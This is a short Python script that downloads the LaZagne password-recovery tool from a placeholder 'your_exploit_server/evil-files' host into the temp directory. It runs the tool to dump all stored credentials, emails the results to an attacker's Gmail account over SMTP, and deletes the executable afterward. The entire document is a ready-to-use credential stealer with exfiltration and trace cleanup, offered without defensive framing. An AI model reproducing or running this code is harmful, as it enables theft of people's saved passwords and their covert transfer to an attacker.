#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]

    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://your_exploit_server/evil-files/lazagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True).decode("utf-8")
send_mail("your@email.com", "password", str(result))
os.remove("LaZagne.exe")
